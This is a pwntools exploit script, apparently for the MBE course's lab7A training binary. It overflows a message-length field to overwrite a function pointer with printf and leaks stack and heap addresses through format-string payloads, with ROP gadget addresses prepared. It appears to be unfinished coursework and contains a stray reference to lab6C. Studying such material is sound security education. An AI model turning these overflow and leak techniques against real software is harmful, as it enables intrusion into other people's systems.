#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *
import subprocess
import time


context.arch = "x86"
# context.log_level = 'debug'
# context.local(aslr=False)
# context.aslr = False

context(terminal = ['terminator', '-e'])

mbe_vm = False
binary = "./lab7A"
if mbe_vm:
    binary = "/levels/lab07/lab7A"

IP = '10.11.12.13'
PORT = 1337
local = True
if not local:
    r = remote(IP, PORT)
else:
    r = process(binary)


gdbscript_file = 'lab7A.gdb.txt'
f = open(gdbscript_file, 'w')
f.write('''
break *0x080bd226
continue
''')
f.close()

term_gdb = subprocess.Popen(['terminator', '-e', '/usr/bin/gdb "./lab6C" %d -x "%s"' % (r.pid, gdbscript_file)])
time.sleep(1)


# create number
def create_message(length, message):
    print r.recvuntil('Enter Choice: ')
    r.sendline("1")
    print r.recvuntil('-Enter data length: ')
    r.sendline("%d"%length)
    print r.recvuntil('-Enter data to encrypt: ')
    r.sendline(message)


def edit_message(index, message):
    print r.recvuntil('Enter Choice: ')
    r.sendline("2")
    print r.recvuntil('-Input message index to edit: ')
    r.sendline("%d"%index)
    print r.recvuntil('-Input new message to encrypt: ')
    r.sendline(message)


def print_message(index):
    print r.recvuntil('Enter Choice: ')
    r.sendline("4")
    print r.recvuntil('-Input message index to print: ')
    r.sendline("%d"%index)


def destroy_message(index):
    print r.recvuntil('Enter Choice: ')
    r.sendline("3")
    print r.recvuntil('-Input message index to destroy:')
    r.sendline("%d"%index)


def read_printed_message():
    # message = r.recvuntil('+%s+'%('-'*40))
    message = r.recvuntil('+%s+'%('-'*39))
    print message
    return message[:-41]

printf = p32(0x8050260)

ret_addr = p32(0x42424242)
pop_eax  = p32(0x080bd226)
syscall  = p32(0x0806448d)

leak = ""
# leak = "%%n"
for i in range(190):
    leak += "%%%d$08x\n"%(i+1)
print leak

# leak = "%18$s\n"
# leak = "%18$u\n"

# leak = "%17$d"
# payload = "A"*(140) + printf + "A"*1024 #p32(0x01) + syscall
payload = "A"*(140) + pop_eax + "A"*264 #p32(0x01) + syscall
stack_leak_payload = "A"*(140) + printf + leak #p32(0x01) + syscall

leak2 = "%18$s\n"
read_ptr_content = "A"*(140) + printf + leak2


create_message(131, "A"*128+p32(len(stack_leak_payload))[:3])
create_message(5, "A"*5)
edit_message(0, stack_leak_payload)
# r.interactive()
print_message(1)
message = read_printed_message()
stack_address = int(message[4:].split('\n', 1)[0])
print "stack_address: 0x%08x" % stack_address

# r.interactive()
# [18] = 0x8050260
# [24] = 0x8050260
# dereferencing address at 18 and 24 is always giving the same value
# if the value is increased using %n to the messages address 0x80eef60
# then it might be possible to dereference it and read the heap address

create_message(131, "A"*128+p32(len(read_ptr_content))[:3])
create_message(5, "A"*5)
edit_message(2, read_ptr_content)
print_message(3)
message = read_printed_message()
print message
print "0x%08x"%u32(message[:4])


# create_message(131, "A"*128+p32(len(payload))[:3])
# create_message(5, "A"*5)
# edit_message(2, payload)
# print_message(3)


r.interactive()
